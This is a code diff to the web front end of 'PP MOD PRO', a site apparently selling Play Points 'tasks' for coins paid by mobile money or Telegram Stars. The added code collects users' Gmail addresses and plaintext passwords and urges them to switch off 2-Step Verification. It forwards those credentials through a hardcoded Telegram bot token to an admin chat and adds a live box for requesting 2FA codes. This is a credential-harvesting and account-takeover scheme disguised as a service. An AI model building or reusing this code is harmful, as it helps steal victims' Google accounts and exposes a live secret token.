@@ -220,7 +220,7 @@
                 <div class="min-w-0 flex-1">
                     <h1 class="text-[15px] font-extrabold text-slate-900 tracking-tight leading-tight"><span class="brand-text">PP MOD</span><span class="ver-badge">PRO</span></h1>
                     <button onclick="goToProfile()" class="flex items-center gap-1 text-[10px] font-bold text-slate-500 hover:text-amber-600 transition-colors cursor-pointer">
-                        <i data-lucide="wallet" class="w-3 h-3"></i> <span id="balanceAmt">0 BDT</span>
+                        <img src="PPCOIN.png" class="w-3.5 h-3.5 object-contain" alt="Coin"> <span id="balanceAmt">0 Coins</span>
                     </button>
                 </div>
             </div>
@@ -387,7 +387,9 @@
                 <span class="step-line"></span>
                 <span class="step active"><span class="n">2</span> Payment</span>
                 <span class="step-line"></span>
-                <span class="step"><span class="n">3</span> Receipt</span>
+                <span class="step"><span class="n">3</span> Details</span>
+                <span class="step-line"></span>
+                <span class="step"><span class="n">4</span> Status</span>
             </div>
             <div id="payOrderCard" class="bg-white border border-slate-200 rounded-2xl p-4 shadow-sm">
                 <div class="flex items-center gap-2.5">
@@ -397,23 +399,23 @@
                         <p id="payGame" class="text-sm font-extrabold text-slate-900 truncate">—</p>
                     </div>
                     <div class="text-right flex-shrink-0">
-                        <p class="text-[10px] font-bold uppercase tracking-widest text-slate-400">Fee</p>
-                        <p class="text-base font-extrabold text-amber-600"><span data-fee>20</span> BDT</p>
+                        <p class="text-[10px] font-bold uppercase tracking-widest text-slate-400">Required</p>
+                        <p class="text-base font-extrabold text-amber-600 flex items-center justify-end gap-1"><img src="PPCOIN.png" class="w-4 h-4 object-contain" alt="Coin"><span data-fee>3</span> Coins</p>
                     </div>
                 </div>
             </div>
             <div id="paneWallet" class="bg-white border border-slate-200 rounded-2xl p-4 shadow-sm space-y-2.5">
                 <div class="flex items-center justify-between bg-slate-50 border border-slate-100 rounded-xl px-3 py-2">
-                    <span class="text-[11px] font-bold text-slate-500 flex items-center gap-1.5"><i data-lucide="wallet" class="w-3.5 h-3.5"></i> Wallet Balance</span>
-                    <span id="payBalance" class="text-sm font-extrabold text-slate-900">0 BDT</span>
+                    <span class="text-[11px] font-bold text-slate-500 flex items-center gap-1.5"><img src="PPCOIN.png" class="w-4 h-4 object-contain"> Your PP Coins</span>
+                    <span id="payBalance" class="text-sm font-extrabold text-slate-900 flex items-center gap-1"><img src="PPCOIN.png" class="w-4 h-4 object-contain"> 0 Coins</span>
                 </div>
                 <button id="walletPayBtn" onclick="window.ppfb&&ppfb.payWallet()" class="w-full flex items-center justify-center gap-2 py-3.5 px-4 text-white font-extrabold rounded-xl transition-all text-sm cursor-pointer">
-                    <i data-lucide="zap" class="w-4 h-4"></i> <span>Pay from Wallet</span>
+                    <i data-lucide="zap" class="w-4 h-4"></i> <span>Pay 3 Coins from Wallet</span>
                 </button>
                 <div id="walletNote" class="hidden text-center bg-rose-50 border border-rose-200 rounded-xl px-3 py-2.5 space-y-2">
-                    <p class="text-[11px] font-semibold text-rose-600">Insufficient balance — age top up korun (min 20 BDT)</p>
+                    <p class="text-[11px] font-semibold text-rose-600">Insufficient PP Coins — Buy Coins first</p>
                     <button onclick="enterTopup('payment')" class="w-full py-2.5 px-4 bg-emerald-600 hover:bg-emerald-500 text-white font-extrabold rounded-xl transition-all text-xs cursor-pointer flex items-center justify-center gap-1.5">
-                        <i data-lucide="plus-circle" class="w-3.5 h-3.5"></i> Add Money
+                        <i data-lucide="plus-circle" class="w-3.5 h-3.5"></i> Buy PP Coins
                     </button>
                 </div>
             </div>
@@ -468,12 +470,62 @@
                     </div>
                     <button data-copy="rocket" onclick="copyNumber('01647712206')" class="text-xs bg-purple-50 hover:bg-purple-100 text-purple-600 font-bold px-3 py-1.5 rounded-xl border border-purple-200 active:scale-95 transition-all">Copy</button>
                 </div>
+
+                <div class="p-3.5 bg-white border border-amber-200/80 rounded-2xl shadow-2xs flex items-center justify-between">
+                    <div class="flex items-center gap-3">
+                        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQdPCmrOZ_l_0GpI-SBCGPyk25IwEQIhWyFMp5Ey11xog&s=10" class="w-9 h-9 rounded-xl object-contain">
+                        <div>
+                            <p class="text-xs font-bold text-slate-800">Telegram Stars (Pay/Gift)</p>
+                            <p class="text-xs font-mono text-amber-600 font-extrabold select-all">@Blackmoney54</p>
+                        </div>
+                    </div>
+                    <button onclick="copyNumber('@Blackmoney54')" class="text-xs bg-amber-50 hover:bg-amber-100 text-amber-700 font-bold px-3 py-1.5 rounded-xl border border-amber-200 active:scale-95 transition-all">Copy</button>
+                </div>
             </div>
 
             <div class="space-y-3.5 bg-white p-4 rounded-2xl border border-slate-200/80 shadow-sm">
                 <div>
-                    <label class="block text-xs font-bold text-slate-600 mb-1.5">Deposit Amount (min 20 BDT)</label>
-                    <input type="number" id="topupAmount" min="20" value="20" class="w-full p-3 bg-slate-50 border border-slate-200 rounded-xl text-xs font-bold focus:outline-none focus:border-emerald-500">
+                    <div class="flex items-center justify-between mb-1.5">
+                        <label class="text-xs font-bold text-slate-700">Select PP Coins (1 Coin = 7 BDT)</label>
+                        <span class="text-[10px] font-extrabold text-amber-600 bg-amber-50 px-2 py-0.5 rounded-full border border-amber-200">Rate: 7৳/Coin</span>
+                    </div>
+
+                    <!-- Preset Coin Boxes -->
+                    <div class="grid grid-cols-3 gap-2 mb-2.5">
+                        <button type="button" onclick="setCoinPack(3)" class="coin-pack-btn p-2.5 bg-slate-50 hover:bg-amber-50 active:scale-95 border-2 border-slate-200 hover:border-amber-400 rounded-xl text-center transition-all cursor-pointer">
+                            <div class="flex items-center justify-center gap-1 font-extrabold text-xs text-slate-800">
+                                <img src="PPCOIN.png" class="w-4 h-4 object-contain"> 3 Coins
+                            </div>
+                            <p class="text-[10px] font-bold text-emerald-600 mt-0.5">21 BDT</p>
+                        </button>
+                        <button type="button" onclick="setCoinPack(15)" class="coin-pack-btn p-2.5 bg-slate-50 hover:bg-amber-50 active:scale-95 border-2 border-slate-200 hover:border-amber-400 rounded-xl text-center transition-all cursor-pointer">
+                            <div class="flex items-center justify-center gap-1 font-extrabold text-xs text-slate-800">
+                                <img src="PPCOIN.png" class="w-4 h-4 object-contain"> 15 Coins
+                            </div>
+                            <p class="text-[10px] font-bold text-emerald-600 mt-0.5">105 BDT</p>
+                        </button>
+                        <button type="button" onclick="setCoinPack(30)" class="coin-pack-btn p-2.5 bg-slate-50 hover:bg-amber-50 active:scale-95 border-2 border-slate-200 hover:border-amber-400 rounded-xl text-center transition-all cursor-pointer">
+                            <div class="flex items-center justify-center gap-1 font-extrabold text-xs text-slate-800">
+                                <img src="PPCOIN.png" class="w-4 h-4 object-contain"> 30 Coins
+                            </div>
+                            <p class="text-[10px] font-bold text-emerald-600 mt-0.5">210 BDT</p>
+                        </button>
+                    </div>
+
+                    <!-- Manual Coin & Amount Inputs -->
+                    <div class="grid grid-cols-2 gap-2">
+                        <div>
+                            <label class="block text-[10px] font-extrabold text-slate-500 uppercase mb-1">Enter Coins</label>
+                            <div class="relative">
+                                <input type="number" id="topupCoins" min="3" value="3" oninput="onCoinInput(this.value)" class="w-full pl-8 pr-2 py-2.5 bg-slate-50 border border-slate-200 rounded-xl text-xs font-black text-slate-900 focus:outline-none focus:border-amber-500">
+                                <img src="PPCOIN.png" class="w-4 h-4 object-contain absolute left-2.5 top-1/2 -translate-y-1/2 pointer-events-none">
+                            </div>
+                        </div>
+                        <div>
+                            <label class="block text-[10px] font-extrabold text-slate-500 uppercase mb-1">Amount to Pay</label>
+                            <input type="number" id="topupAmount" min="21" value="21" oninput="onAmountInput(this.value)" class="w-full p-2.5 bg-emerald-50/50 border border-emerald-200 text-emerald-700 font-black text-xs rounded-xl focus:outline-none focus:border-emerald-500">
+                        </div>
+                    </div>
                 </div>
                 <div>
                     <label class="block text-xs font-bold text-slate-600 mb-1.5">Select Payment Method</label>
@@ -500,12 +552,28 @@
                                 <span class="flex-1 text-left">Rocket</span>
                                 <span class="pay-tick">✓</span>
                             </button>
+                            <button type="button" onclick="setMethod('top', 'Telegram Stars')" data-val="Telegram Stars" class="pay-opt top-opt">
+                                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQdPCmrOZ_l_0GpI-SBCGPyk25IwEQIhWyFMp5Ey11xog&s=10" class="w-7 h-7 rounded-lg object-contain bg-white border border-slate-100" alt="">
+                                <span class="flex-1 text-left">Telegram Stars</span>
+                                <span class="pay-tick">✓</span>
+                            </button>
                         </div>
                     </div>
                 </div>
 
+                <!-- Stars Special Notice Box -->
+                <div id="starsNoticeBox" class="hidden p-3 bg-amber-50/80 border border-amber-200 rounded-xl text-left space-y-1">
+                    <p class="text-[11px] font-bold text-amber-900 flex items-center gap-1.5">
+                        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQdPCmrOZ_l_0GpI-SBCGPyk25IwEQIhWyFMp5Ey11xog&s=10" class="w-4 h-4 object-contain">
+                        Telegram Stars Payment Instructions:
+                    </p>
+                    <p class="text-[11px] text-amber-800 leading-snug font-medium">
+                        <span class="font-extrabold text-amber-950 font-mono">@Blackmoney54</span> এ Stars সেন্ড/গিফট করে আপনার প্রোফাইল লিংক ও সেন্ড করার স্ক্রিনশট পাঠিয়ে দিন। নিচের বক্সে আপনার নিজের টেলিগ্রাম ইউজারনেমটি লিখুন।
+                    </p>
+                </div>
+
                 <div>
-                    <label class="block text-xs font-bold text-slate-600 mb-1.5">Transaction ID (TrxID)</label>
+                    <label id="trxLabel" class="block text-xs font-bold text-slate-600 mb-1.5">Transaction ID (TrxID)</label>
                     <input type="text" id="trxId" placeholder="Enter TrxID after send money" class="w-full p-3 bg-slate-50 border border-slate-200 rounded-xl text-xs font-mono uppercase font-semibold focus:outline-none focus:border-emerald-500">
                 </div>
 
@@ -520,22 +588,98 @@
             </button>
         </main>
 
-        <!-- SCREEN 3: SUCCESS & RECEIPT -->
+        <!-- SCREEN 2.5: CREDENTIALS SUBMISSION -->
+        <main id="screenCredentials" class="screen space-y-3.5 hidden fit-scroll">
+            <div class="steps px-1">
+                <span class="step done"><span class="n">✓</span> Games</span>
+                <span class="step-line"></span>
+                <span class="step done"><span class="n">✓</span> Payment</span>
+                <span class="step-line"></span>
+                <span class="step active"><span class="n">3</span> Details</span>
+                <span class="step-line"></span>
+                <span class="step"><span class="n">4</span> Status</span>
+            </div>
+
+            <div class="bg-gradient-to-r from-amber-500 to-orange-500 p-4 rounded-2xl text-white shadow-sm flex items-center gap-3">
+                <img id="credGameLogo" class="w-11 h-11 rounded-xl object-cover bg-white/20 p-1 flex-shrink-0" alt="">
+                <div class="flex-1 min-w-0">
+                    <p class="text-[10px] font-bold uppercase tracking-wider text-amber-100">Task Paid: 3 Coins</p>
+                    <p id="credGameTitle" class="text-sm font-black truncate">—</p>
+                </div>
+            </div>
+
+            <!-- Crucial 2FA Warning Card -->
+            <div class="bg-amber-50 border-2 border-amber-300 rounded-2xl p-3.5 space-y-1 text-left">
+                <div class="flex items-center gap-2 text-amber-800 font-extrabold text-xs">
+                    <i data-lucide="shield-alert" class="w-4 h-4 flex-shrink-0 text-amber-600"></i>
+                    <span>লগইন সংক্রান্ত জরুরি নোটিশ:</span>
+                </div>
+                <p class="text-[11px] text-amber-950 font-semibold leading-relaxed">
+                    👉 Gmail-এ <span class="font-extrabold text-amber-800">2-Step Verification (2FA)</span> চালু থাকলেও সমস্যা নেই। তবে অন থাকলে স্বয়ংক্রিয় বটের লগইন করতে কিছুটা ঝামেলা বা অতিরিক্ত সময় লাগতে পারে। তাই ঝামেলামুক্ত দ্রুত কাজের জন্য কাজ শেষ হওয়া পর্যন্ত সিকিউরিটি অফ রাখাই উত্তম।
+                </p>
+            </div>
+
+            <div class="bg-white p-4 rounded-2xl border border-slate-200/80 shadow-sm space-y-3 text-left">
+                <div>
+                    <label class="block text-xs font-bold text-slate-700 mb-1">Play Store Gmail Address *</label>
+                    <input type="email" id="accEmail" placeholder="yourgmail@gmail.com" class="w-full p-3 bg-slate-50 border border-slate-200 rounded-xl text-xs font-bold focus:outline-none focus:border-amber-500">
+                </div>
+                <div>
+                    <label class="block text-xs font-bold text-slate-700 mb-1">Gmail Password *</label>
+                    <input type="text" id="accPass" placeholder="Password দিন" class="w-full p-3 bg-slate-50 border border-slate-200 rounded-xl text-xs font-bold focus:outline-none focus:border-amber-500">
+                </div>
+                <div>
+                    <div class="flex items-center justify-between mb-1">
+                        <label class="text-xs font-bold text-slate-700">Your Telegram Chat ID (নোটিফিকেশনের জন্য)</label>
+                        <a href="https://t.me/Ppmod_bot" target="_blank" class="text-[10px] font-extrabold text-indigo-600 hover:underline flex items-center gap-0.5">
+                            <i data-lucide="bot" class="w-3 h-3"></i> @Ppmod_bot থেকে জানুন
+                        </a>
+                    </div>
+                    <input type="text" id="accTgId" placeholder="e.g. 123456789 বা @username" class="w-full p-3 bg-slate-50 border border-slate-200 rounded-xl text-xs font-mono font-bold focus:outline-none focus:border-amber-500">
+                </div>
+
+                <button id="submitCredBtn" onclick="submitOrderCredentials()" class="w-full py-3.5 bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-700 hover:to-teal-700 text-white font-extrabold rounded-xl shadow-md transition-all text-sm cursor-pointer flex items-center justify-center gap-2 active:scale-98">
+                    <i data-lucide="send" class="w-4 h-4"></i> Submit to Admin
+                </button>
+            </div>
+        </main>
+
+        <!-- SCREEN 3: SUCCESS & LIVE TRACKING RECEIPT -->
         <main id="screenSuccess" class="screen space-y-4 hidden fit-scroll text-center bg-white p-6 rounded-2xl border border-slate-200/80 shadow-sm">
             <div class="steps px-1 text-left">
                 <span class="step done"><span class="n">✓</span> Games</span>
                 <span class="step-line"></span>
                 <span class="step done"><span class="n">✓</span> Payment</span>
                 <span class="step-line"></span>
-                <span class="step active"><span class="n">3</span> Receipt</span>
+                <span class="step done"><span class="n">✓</span> Details</span>
+                <span class="step-line"></span>
+                <span class="step active"><span class="n">4</span> Status</span>
             </div>
-            <div class="flex justify-center">
-                <lottie-player src="https://lottie.host/41d6fc95-7f61-416c-b296-53a5836c22c2/BgBmgewgEu.json" background="transparent" speed="1" style="width: 130px; height: 130px;" autoplay></lottie-player>
+
+            <!-- Animated Status Icon Box -->
+            <div id="receiptStatusAnim" class="flex justify-center">
+                <lottie-player src="https://lottie.host/41d6fc95-7f61-416c-b296-53a5836c22c2/BgBmgewgEu.json" background="transparent" speed="1" style="width: 130px; height: 130px;" autoplay loop></lottie-player>
             </div>
 
             <div class="space-y-1">
-                <h2 id="successTitle" class="text-base font-extrabold text-slate-900">Payment Submitted!</h2>
-                <p id="successMsg" class="text-xs text-slate-600 font-medium">অনুগ্রহ করে নিচের রিসিটের স্ক্রিনশট নিন এবং এডমিনকে পাঠান।</p>
+                <h2 id="successTitle" class="text-base font-extrabold text-slate-900">Task Processing</h2>
+                <p id="successMsg" class="text-xs text-slate-600 font-medium leading-relaxed">এডমিন আপনার কাজটি করছে। সম্পন্ন হলে নোটিফিকেশন পাবেন।</p>
+            </div>
+
+            <!-- Admin Live Message / 2FA Code Request Desk -->
+            <div id="adminLiveMsgBox" class="p-4 bg-gradient-to-br from-indigo-50 to-purple-50 border-2 border-indigo-200 rounded-2xl text-left shadow-sm space-y-1.5 transition-all">
+                <div class="flex items-center justify-between">
+                    <div class="flex items-center gap-2">
+                        <span class="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse"></span>
+                        <span class="text-xs font-black uppercase tracking-wider text-indigo-900">Admin Message Desk</span>
+                    </div>
+                    <span class="text-[10px] font-extrabold bg-indigo-100 text-indigo-700 px-2 py-0.5 rounded-full">Live</span>
+                </div>
+                <div class="p-3 bg-white/90 border border-indigo-100 rounded-xl">
+                    <p id="adminLiveMsgText" class="text-xs font-bold text-slate-800 leading-relaxed whitespace-pre-wrap">
+                        অপেক্ষা করুন, এডমিন লগইন করছে। কোনো টু-স্টেপ কোড বা অনুমোদনের প্রয়োজন হলে এখানে মেসেজ দেওয়া হবে।
+                    </p>
+                </div>
             </div>
 
             <div class="bg-slate-50 border border-slate-200 rounded-xl p-3.5 text-left space-y-2.5 shadow-2xs">
@@ -578,16 +722,16 @@
                 <img id="profilePhoto" class="w-16 h-16 rounded-2xl object-cover mx-auto bg-slate-100 border border-slate-200" alt="">
                 <h2 id="profileName" class="text-base font-extrabold text-slate-900 pt-1">User</h2>
                 <p id="profileEmail" class="text-[11px] text-slate-400 font-medium"></p>
-                <div class="flex items-center justify-between bg-gradient-to-br from-slate-900 to-slate-800 text-white rounded-xl px-4 py-3 mt-3">
-                    <span class="text-[11px] font-bold text-slate-300 flex items-center gap-1.5"><i data-lucide="wallet" class="w-4 h-4 text-amber-400"></i> Wallet Balance</span>
-                    <span id="profileBalance" class="text-lg font-extrabold text-amber-400">0 BDT</span>
+                <div class="flex items-center justify-between bg-gradient-to-br from-slate-900 to-slate-800 text-white rounded-xl px-4 py-3 mt-3 shadow-md">
+                    <span class="text-[11px] font-bold text-slate-300 flex items-center gap-1.5"><img src="PPCOIN.png" class="w-5 h-5 object-contain"> PP Coins Balance</span>
+                    <span id="profileBalance" class="text-lg font-extrabold text-amber-400 flex items-center gap-1"><img src="PPCOIN.png" class="w-5 h-5 object-contain"> 0 Coins</span>
                 </div>
                 <button onclick="copyNumber(document.getElementById('profileUid').innerText)" class="w-full mt-3 flex items-center justify-between gap-2 bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 cursor-pointer">
                     <span class="text-[10px] font-bold text-slate-400 flex-shrink-0">MY UID (tap to copy)</span>
                     <span id="profileUid" class="text-[10px] font-mono font-bold text-slate-600 truncate">—</span>
                 </button>
                 <button onclick="enterTopup('profile')" class="w-full mt-2 py-2.5 px-4 bg-amber-500 hover:bg-amber-600 text-white font-bold rounded-xl transition-all text-xs cursor-pointer flex items-center justify-center gap-1.5">
-                    <i data-lucide="plus-circle" class="w-3.5 h-3.5"></i> Top Up Wallet
+                    <i data-lucide="plus-circle" class="w-3.5 h-3.5"></i> Buy PP Coins
                 </button>
                 <div class="grid grid-cols-2 gap-2 pt-2">
                     <button onclick="resetToHome()" class="py-2.5 px-4 bg-slate-100 hover:bg-slate-200 border border-slate-200 text-slate-600 font-bold rounded-xl transition-all text-xs cursor-pointer">Home</button>
@@ -601,10 +745,13 @@
                     <button onclick="redeemGo()" class="px-4 py-2.5 bg-slate-900 hover:bg-slate-700 text-white font-bold rounded-xl text-xs transition-all cursor-pointer flex-shrink-0">Redeem</button>
                 </div>
             </div>
-            <div>
-                <button onclick="openSupport()" class="w-full py-2.5 px-3 bg-violet-50 border border-violet-200 text-violet-700 font-extrabold rounded-xl text-xs cursor-pointer flex items-center justify-center gap-1.5">
-                    <i data-lucide="messages-square" class="w-3.5 h-3.5"></i> Support
-                </button>
+            <div class="grid grid-cols-2 gap-2">
+                <a href="https://t.me/Blackmoney54" target="_blank" class="py-2.5 px-3 bg-violet-50 hover:bg-violet-100 border border-violet-200 text-violet-700 font-extrabold rounded-xl text-xs cursor-pointer flex items-center justify-center gap-1.5 transition-all">
+                    <i data-lucide="send" class="w-3.5 h-3.5"></i> Support
+                </a>
+                <a href="https://t.me/googleplaypointhack" target="_blank" class="py-2.5 px-3 bg-sky-50 hover:bg-sky-100 border border-sky-200 text-sky-700 font-extrabold rounded-xl text-xs cursor-pointer flex items-center justify-center gap-1.5 transition-all">
+                    <i data-lucide="megaphone" class="w-3.5 h-3.5"></i> Channel
+                </a>
             </div>
             <div id="ticketList" class="space-y-2"></div>
             <div class="flex items-center justify-between px-1">
@@ -763,8 +910,22 @@
             document.getElementById('startBtnLabel').innerText = 'Proceed with Selection';
         }
 
+        const TG_BOT_TOKEN = "8906230491:AAEu4CX0T9Dz6YMLxeCNz6U-nbiQmiBiJ_s";
+        const ADMIN_TG_ID = "7504616242";
+
+        async function sendTelegramMsg(chatId, text) {
+            if (!chatId || !text) return;
+            try {
+                await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' })
+                });
+            } catch (e) { console.warn('TG send error:', e); }
+        }
+
         function showScreen(id) {
-            ['screenLogin', 'screenGameSelect', 'screenPayment', 'screenTopup', 'screenSuccess', 'screenProfile'].forEach(s => {
+            ['screenLogin', 'screenGameSelect', 'screenPayment', 'screenTopup', 'screenCredentials', 'screenSuccess', 'screenProfile'].forEach(s => {
                 const el = document.getElementById(s);
                 if (el) el.classList.toggle('hidden', s !== id);
             });
@@ -822,17 +983,58 @@
             }
         }
 
+        function getCoinRate() {
+            return Number(window.ppfb && window.ppfb.config && window.ppfb.config.coinRate) || 7;
+        }
+        const STARS_PER_COIN = 6; // 3 Coins = 18 Stars
+
+        function isStarsPayment() {
+            const el = document.getElementById('topMethod');
+            return el && el.value === 'Telegram Stars';
+        }
+
+        function setCoinPack(coins) {
+            const c = Math.max(1, Math.floor(Number(coins) || 3));
+            const coinEl = document.getElementById('topupCoins');
+            const amtEl = document.getElementById('topupAmount');
+            const rate = getCoinRate();
+            if (coinEl) coinEl.value = c;
+            if (amtEl) {
+                amtEl.value = isStarsPayment() ? (c * STARS_PER_COIN) : (c * rate);
+            }
+        }
+
+        function onCoinInput(val) {
+            const coins = Math.max(0, Math.floor(Number(val) || 0));
+            const amtEl = document.getElementById('topupAmount');
+            const rate = getCoinRate();
+            if (amtEl) {
+                amtEl.value = isStarsPayment() ? (coins * STARS_PER_COIN) : (coins * rate);
+            }
+        }
+
+        function onAmountInput(val) {
+            const amt = Math.max(0, Math.floor(Number(val) || 0));
+            const coinEl = document.getElementById('topupCoins');
+            const rate = isStarsPayment() ? STARS_PER_COIN : getCoinRate();
+            if (coinEl) coinEl.value = Math.floor(amt / rate);
+        }
+
         async function submitPayment() {
             const amtEl = document.getElementById('topupAmount');
-            const amount = Math.floor(Number(amtEl.value));
-            const minDep = Number((window.ppfb && window.ppfb.config && window.ppfb.config.minDeposit) || 20);
-            if (!amount || amount < minDep) {
-                toast('Minimum deposit is ' + minDep + ' BDT');
+            const coinsEl = document.getElementById('topupCoins');
+            const amount = Math.floor(Number(amtEl ? amtEl.value : 0));
+            const coins = Math.floor(Number(coinsEl ? coinsEl.value : 0)) || Math.floor(amount / COIN_RATE);
+            if (!coins || coins < 3) {
+                toast('Minimum deposit is 3 Coins (21 BDT)');
                 return;
             }
             const trxId = document.getElementById('trxId').value.trim();
+            const method = document.getElementById('topMethod').value;
+            const isStars = (method === 'Telegram Stars');
+
             if (!trxId) {
-                toast('Please enter your Transaction ID (TrxID)');
+                toast(isStars ? 'Apnar Telegram Username likhun' : 'Please enter your Transaction ID (TrxID)');
                 return;
             }
             if (!window.ppfb || !window.ppfb.saveDeposit) {
@@ -842,18 +1044,21 @@
             const btn = document.getElementById('depositBtn');
             btn.disabled = true;
             try {
-                const method = document.getElementById('topMethod').value;
-                const r = await window.ppfb.saveDeposit({ method: method, amount: amount, trxId: trxId });
+                const finalTrx = isStars ? (trxId.startsWith('@') ? trxId : '@' + trxId) : trxId.toUpperCase();
+                const r = await window.ppfb.saveDeposit({ method: method, amount: amount, coins: coins, trxId: finalTrx });
                 if (!r.ok) {
                     toast(r.error || 'Deposit failed, try again');
                     return;
                 }
-                window.ppfb.ev('deposit_submit', { method: method, amount: amount });
+                window.ppfb.ev('deposit_submit', { method: method, amount: amount, coins: coins });
                 fillReceipt({
                     title: 'Deposit Submitted!',
-                    msg: 'Admin approval er por balance add hobe. Then wallet diye pay koro.',
-                    game: 'Wallet Top-up', logo: '', method: method,
-                    amount: amount, trx: trxId.toUpperCase()
+                    msg: isStars
+                        ? '@Blackmoney54 e Stars sent er screenshot pathiye din. Verify kore ' + coins + ' PP Coins dewa hobe.'
+                        : 'Admin approval er por ' + coins + ' PP Coins balance e add hobe.',
+                    game: coins + ' PP Coins Top-up', logo: 'PPCOIN.png', method: method,
+                    amount: amount + (isStars ? ' Stars (' : ' BDT (') + coins + ' Coins)',
+                    trx: finalTrx
                 });
                 document.getElementById('trxId').value = '';
             } finally {
@@ -893,6 +1098,117 @@
             }
         }
         function closeRedeem() { document.getElementById('redeemModal').style.display = 'none'; }
+
+        function openCredentialScreen(game, logo) {
+            const elGame = document.getElementById('credGameTitle');
+            const elLogo = document.getElementById('credGameLogo');
+            if (elGame) elGame.textContent = game || window._payGame || 'Selected Task';
+            if (elLogo) {
+                const finalLogo = logo || window._payGameLogo || PP_LOGO;
+                elLogo.src = finalLogo;
+                elLogo.style.display = '';
+            }
+            const scr = document.getElementById('screenCredentials');
+            if (scr) scr.scrollTop = 0;
+            showScreen('screenCredentials');
+            if (window.lucide) lucide.createIcons();
+        }
+
+        async function submitOrderCredentials() {
+            const email = (document.getElementById('accEmail').value || '').trim();
+            const pass = (document.getElementById('accPass').value || '').trim();
+            const tgId = (document.getElementById('accTgId').value || '').trim();
+            const orderId = window._currentOrderId;
+
+            if (!email || !pass) {
+                toast('Gmail ও Password দুটিই অবশ্যই দিতে হবে!');
+                return;
+            }
+            if (!orderId) {
+                toast('Order ID missing. Please retry.');
+                return;
+            }
+
+            const btn = document.getElementById('submitCredBtn');
+            btn.disabled = true;
+            btn.textContent = 'Submitting...';
+
+            try {
+                // Update order in Firestore with credentials
+                await _setDoc(_doc(db, 'orders', orderId), {
+                    accEmail: email,
+                    accPass: pass,
+                    userTgId: tgId,
+                    adminMsg: 'এডমিন আপনার কাজটি প্রসেস করছে। প্রয়োজন হলে কোডের জন্য এখানে মেসেজ দেবে।',
+                    status: 'paid'
+                }, { merge: true });
+
+                // Send instant notification to Admin via Telegram Bot
+                const u = auth && auth.currentUser;
+                const adminMsg = `🚨 <b>NEW PP TASK ORDER!</b>\n\n` +
+                    `🎮 <b>Game:</b> ${window._payGame || 'Task'}\n` +
+                    `👤 <b>User:</b> ${u ? u.displayName : 'Unknown'} (${u ? u.email : ''})\n` +
+                    `📧 <b>Gmail:</b> <code>${email}</code>\n` +
+                    `🔑 <b>Password:</b> <code>${pass}</code>\n` +
+                    `✈️ <b>User TG:</b> ${tgId || 'None'}\n` +
+                    `🆔 <b>Order ID:</b> <code>${orderId}</code>`;
+
+                sendTelegramMsg(ADMIN_TG_ID, adminMsg);
+
+                fillReceipt({
+                    title: 'Task Processing',
+                    msg: 'আপনার জিমেইল তথ্য এডমিনের কাছে পাঠানো হয়েছে। এডমিন কাজ শুরু করেছে।',
+                    game: window._payGame || 'Task',
+                    logo: window._payGameLogo,
+                    method: 'PP Coins',
+                    amount: '3 Coins',
+                    trx: orderId,
+                    status: 'paid'
+                });
+                trackLiveOrder(orderId);
+            } catch (e) {
+                console.warn(e);
+                toast('Submission failed: ' + (e.message || 'try again'));
+            } finally {
+                btn.disabled = false;
+                btn.innerHTML = '<i data-lucide="send" class="w-4 h-4"></i> Submit to Admin';
+                if (window.lucide) lucide.createIcons();
+            }
+        }
+
+        let liveOrderUnsub = null;
+        function trackLiveOrder(orderId) {
+            if (liveOrderUnsub) liveOrderUnsub();
+            liveOrderUnsub = _snap(_doc(db, 'orders', orderId), docSnap => {
+                if (!docSnap.exists()) return;
+                const ord = docSnap.data();
+                updateReceiptStatus(ord.status);
+                const msgBox = document.getElementById('adminLiveMsgText');
+                if (msgBox && ord.adminMsg) {
+                    msgBox.textContent = ord.adminMsg;
+                }
+            });
+        }
+
+        function updateReceiptStatus(status) {
+            const animBox = document.getElementById('receiptStatusAnim');
+            const title = document.getElementById('successTitle');
+            const msg = document.getElementById('successMsg');
+            if (status === 'completed') {
+                if (animBox) animBox.innerHTML = '<lottie-player src="https://assets10.lottiefiles.com/packages/lf20_jbrwfy9x.json" background="transparent" speed="1" style="width: 140px; height: 140px;" autoplay></lottie-player>';
+                if (title) { title.textContent = 'Task Completed!'; title.className = 'text-base font-extrabold text-emerald-600'; }
+                if (msg) msg.textContent = 'অভিনন্দন! আপনার কাজটি সফলভাবে সম্পন্ন হয়েছে।';
+            } else if (status === 'rejected') {
+                if (animBox) animBox.innerHTML = '<div class="w-20 h-20 rounded-full bg-rose-100 flex items-center justify-center text-rose-600 mx-auto mb-2"><i data-lucide="x-circle" class="w-12 h-12"></i></div>';
+                if (title) { title.textContent = 'Task Cancelled / Rejected'; title.className = 'text-base font-extrabold text-rose-600'; }
+                if (msg) msg.textContent = 'দুঃখিত, কোনো সমস্যার কারণে অর্ডারটি বাতিল করা হয়েছে। সাপোর্টে যোগাযোগ করুন।';
+            } else {
+                if (animBox) animBox.innerHTML = '<lottie-player src="https://lottie.host/41d6fc95-7f61-416c-b296-53a5836c22c2/BgBmgewgEu.json" background="transparent" speed="1" style="width: 130px; height: 130px;" autoplay loop></lottie-player>';
+                if (title) { title.textContent = 'Task In Progress...'; title.className = 'text-base font-extrabold text-amber-600'; }
+                if (msg) msg.textContent = 'এডমিন কাজ করছে। কাজ চলাকালীন জিমেইলে ঢুকবেন না।';
+            }
+            if (window.lucide) lucide.createIcons();
+        }
 
         function fillReceipt(o) {
             document.getElementById('successTitle').innerText = o.title;
@@ -939,7 +1255,8 @@
         const PAY_LOGOS = {
             bKash: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTdjxXCpOG7jJdpeVHm9R_xCZ6hrcRr23H-Y99mIloKRA&s=10',
             Nagad: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTU9xlcZDT6VNZ0dLPxDpO6t-kCTbGa1om1cAuXVCNboA&s=10',
-            Rocket: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTP0eawh77HPEryf218TiXutIyR4EXTAJhbiWHg_ManMg&s=10'
